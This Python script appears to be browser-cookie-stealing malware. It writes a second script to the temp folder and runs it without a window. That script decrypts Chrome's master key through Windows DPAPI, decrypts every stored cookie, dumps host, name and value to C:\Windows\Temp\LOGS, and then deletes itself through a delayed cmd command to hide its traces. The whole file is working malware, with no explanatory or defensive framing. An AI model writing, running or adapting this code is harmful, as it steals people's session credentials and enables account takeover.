import tempfile
import os
import subprocess

def write_and_run_payload():
    temp_dir = tempfile.gettempdir()
    payload_path = os.path.join(temp_dir, "chromedump_payload.pyw")

    payload_code = '''\
import os
import sqlite3
import shutil
import json
import base64
import sys
import subprocess
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_decryption_key():
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def get_all_cookies(output_path):
    db_path = os.path.join(
        os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Network", "Cookies"
    )
    temp_db = os.path.join(os.getenv("TEMP"), "temp_cookies_db")
    shutil.copy2(db_path, temp_db)
    key = get_decryption_key()
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    with open(output_path, "w", encoding="utf-8") as out_file:
        for host_key, name, encrypted_value in cursor.fetchall():
            try:
                nonce = encrypted_value[3:15]
                cipher = encrypted_value[15:]
                aesgcm = AESGCM(key)
                value = aesgcm.decrypt(nonce, cipher, None).decode()
            except:
                value = "[Decryption Failed]"
            out_file.write(f"{host_key}\\t{name}\\t{value}\\n")
    cursor.close()
    conn.close()
    os.remove(temp_db)

def self_delete():
    this_file = os.path.abspath(sys.argv[0])
    subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 3 > nul & del "{this_file}"', shell=True)

if __name__ == "__main__":
    output_file = r"C:\\Windows\\Temp\\LOGS"
    get_all_cookies(output_file)
    self_delete()
'''

    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(payload_code)

    subprocess.run(["pythonw", payload_path], check=True)

write_and_run_payload()
